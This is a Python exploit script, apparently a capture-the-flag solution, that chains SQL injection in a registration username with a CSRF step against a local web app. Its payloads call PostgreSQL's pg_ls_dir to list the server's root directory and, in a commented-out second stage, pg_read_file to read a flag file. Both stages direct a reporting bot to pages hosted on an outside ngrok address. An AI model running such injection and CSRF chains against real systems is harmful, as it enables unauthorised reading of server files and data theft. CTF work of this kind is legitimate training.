import requests
from time import sleep

BASE_URL = "http://localhost:5000"

# STEP 1 - Register a user to list file in the root directory

user = 'yqroo'
pl_ls = "yqroo', (select pg_ls_dir('/') order by 1 offset 6 limit 1)) --"

requests.post(BASE_URL + "/register", data={"username": user, "password": '123'})

s = requests.session()
r = s.post(BASE_URL + "/register", data={"username": pl_ls, "password": '123'})
r = s.post(BASE_URL + "/login", data={"username": pl_ls, "password": '123'})
r = s.post(BASE_URL + "/report", data={"url": "http://0.tcp.ap.ngrok.io:18128/csrf_list_file.html"})

r = s.post(BASE_URL + "/sendcv", files={"cv": open("dummy.pdf", "rb")})

s = requests.session()
r = s.post(BASE_URL + "/login", data={"username": user, "password": '123'})
r = s.get(BASE_URL + "/")
print(r.text)

# STEP 2 - Read the flag file

# pl_cat = "yqroo', (select pg_read_file('/flag_vrsd2mReIvQJBopysBuJbl6aNVqZs5N1.txt'))) --" # CHANGE THE FLAG

# s = requests.session()
# r = s.post(BASE_URL + "/register", data={"username": pl_cat, "password": '123'})
# r = s.post(BASE_URL + "/login", data={"username": pl_cat, "password": '123'})
# r = s.post(BASE_URL + "/report", data={"url": "http://0.tcp.ap.ngrok.io:15142/csrf_read_file.html"})
# sleep(20)
# r = s.post(BASE_URL + "/sendcv", files={"cv": open("dummy.pdf", "rb")})

# s = requests.session()
# r = s.post(BASE_URL + "/login", data={"username": user, "password": '123'})
# r = s.get(BASE_URL + "/")
# print(r.text)